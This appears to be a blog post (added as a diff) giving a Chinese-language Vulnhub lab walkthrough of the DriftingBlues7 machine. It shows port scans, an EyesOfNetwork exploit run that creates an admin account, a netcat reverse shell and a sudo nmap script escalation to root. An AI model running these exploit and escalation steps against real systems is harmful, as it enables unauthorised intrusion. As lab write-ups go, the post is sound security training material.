@@ -1,0 +1,207 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulnhub系列-Driftingblues7 | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
+
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="cve">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Vulnhub系列-Driftingblues7"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Vulnhub系列-Driftingblues7</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/06/20/vulnhubDriftingblues7/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-06-20T00:23:22.000Z">
+          2021-06-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><img src="/2021/06/20/vulnhubDriftingblues7/3.jpg" alt></p>
+<a id="more"></a>
+<p><strong>端口扫描</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -p- -vv -A -oA nmap 192.168.56.113</span><br></pre></td></tr></table></figure>
+<p>开放了多个端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Discovered open port 3306&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 111&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 443&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 22&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 80&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 2403&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 8086&#x2F;tcp on 192.168.56.113</span><br><span class="line">Discovered open port 66&#x2F;tcp on 192.168.56.113</span><br></pre></td></tr></table></figure>
+<p>经过测试66端口的服务没什么利用价值，所以寻找其他服务</p>
+<p><strong>3306端口</strong></p>
+<p>3306端口无法远程连接</p>
+<p><strong>66端口</strong></p>
+<p>一个http服务，但是没有找到什么有价值的内容，尝试一下目录扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.113:66&#x2F; -x php,txt,html -t 40 -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt --no-error</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag.txt             (Status: 200) [Size: 1823]</span><br><span class="line">&#x2F;index_files          (Status: 301) [Size: 0] [--&gt; &#x2F;index_files&#x2F;]</span><br></pre></td></tr></table></figure>
+<p>访问flag.txt可以看到flag，但是应该是个假flag</p>
+<p><strong>80端口</strong></p>
+<p>进行一下目录扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;192.168.56.113&#x2F; -k -x php,txt,html -t 40 -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-medium.txt -b 302,404,301,500</span><br></pre></td></tr></table></figure>
+<p>没有扫到什么有效的目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;login.php</span><br><span class="line">&#x2F;header.php</span><br><span class="line">&#x2F;logout.php</span><br></pre></td></tr></table></figure>
+<p>发现80端口部署了eyes of works，搜索相应的漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues7]</span><br><span class="line">└─$ searchsploit eyes of network</span><br><span class="line">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                        |  Path</span><br><span class="line">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">EyesOfNetwork (EON) 5.0 - Remote Code Execution                                       | php&#x2F;webapps&#x2F;41746.md</span><br><span class="line">EyesOfNetwork (EON) 5.0 - SQL Injection                                               | php&#x2F;webapps&#x2F;41747.md</span><br><span class="line">EyesOfNetwork (EON) 5.1 - SQL Injection                                               | php&#x2F;webapps&#x2F;41774.py</span><br><span class="line">EyesOfNetwork - AutoDiscovery Target Command Execution (Metasploit)                   | multiple&#x2F;remote&#x2F;48169.rb</span><br><span class="line">EyesOfNetwork 5.1 - Authenticated Remote Command Execution                            | php&#x2F;webapps&#x2F;47280.py</span><br><span class="line">EyesOfNetwork 5.3 - File Upload Remote Code Execution                                 | multiple&#x2F;webapps&#x2F;49432.sh</span><br><span class="line">EyesOfNetwork 5.3 - LFI                                                               | multiple&#x2F;webapps&#x2F;49404.txt</span><br><span class="line">EyesOfNetwork 5.3 - RCE &amp; PrivEsc                                                     | multiple&#x2F;webapps&#x2F;49402.txt</span><br><span class="line">EyesOfNetwork 5.3 - Remote Code Execution                                             | php&#x2F;webapps&#x2F;48025.txt</span><br><span class="line">-------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+<p>使用48025.txt可以创建出新的管理员用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;48025.txt https:&#x2F;&#x2F;192.168.56.113 -ip 127.0.0.1 -port 8888 -user snow</span><br></pre></td></tr></table></figure>
+<p>用户名和密码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow:net_was_here</span><br></pre></td></tr></table></figure>
+<p>使用该超级管理员账号登录，然后访问autodiscovery.php文件可以通过nmap进行getshell</p>
+<p><img src="/2021/06/20/vulnhubDriftingblues7/1.png" alt></p>
+<p>在本地监听8888端口，然后执行该扫描即可得到反弹的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues7]</span><br><span class="line">└─$ nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.56.113: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.113] 38132</span><br><span class="line">ls</span><br><span class="line">autodiscover.php</span><br><span class="line">classes.inc.php</span><br><span class="line">engines</span><br><span class="line">whoami</span><br><span class="line">apache</span><br></pre></td></tr></table></figure>
+<p>此时是apache用户，该用户可以在不使用密码的情况下通过sudo执行nmap命令从而提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; &#x2F;tmp&#x2F;nmap.script</span><br><span class="line">sudo nmap --script&#x3D;&#x2F;tmp&#x2F;nmap.script</span><br></pre></td></tr></table></figure>
+<p>此时即可获得root权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">cd &#x2F;root</span><br><span class="line">ls</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">eon</span><br><span class="line">flag.txt</span><br><span class="line">index.htm</span><br><span class="line">index_files</span><br><span class="line">logdel2</span><br><span class="line">upit.sh</span><br><span class="line">cat flag.txt</span><br><span class="line">flag 1&#x2F;1</span><br></pre></td></tr></table></figure>
+<p>登录之后查看sudoers文件可以看到与我们所想一致</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># eonweb</span><br><span class="line">apache ALL&#x3D;NOPASSWD:&#x2F;bin&#x2F;systemctl * snmptt,&#x2F;bin&#x2F;systemctl * snmptrapd,&#x2F;bin&#x2F;systemctl * snmpd,&#x2F;bin&#x2F;systemctl * nagios,&#x2F;bin&#x2F;systemctl * gedd,&#x2F;usr&#x2F;bin&#x2F;nmap</span><br></pre></td></tr></table></figure>
+<p><strong>111端口</strong></p>
+<p>开启的是一个rpcbind服务，暂没找到利用思路</p>
+<p><strong>443</strong></p>
+<p>https服务，80端口会跳转到该https网站</p>
+<p><strong>2403</strong></p>
+<p>部署的是一个taskmaster服务</p>
+<p><strong>8086</strong></p>
+<p>部署的是一个InfluxDB http admin服务</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要加强公开CVE的利用能力</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/vulnhub/">vulnhub</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/cve/">cve</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
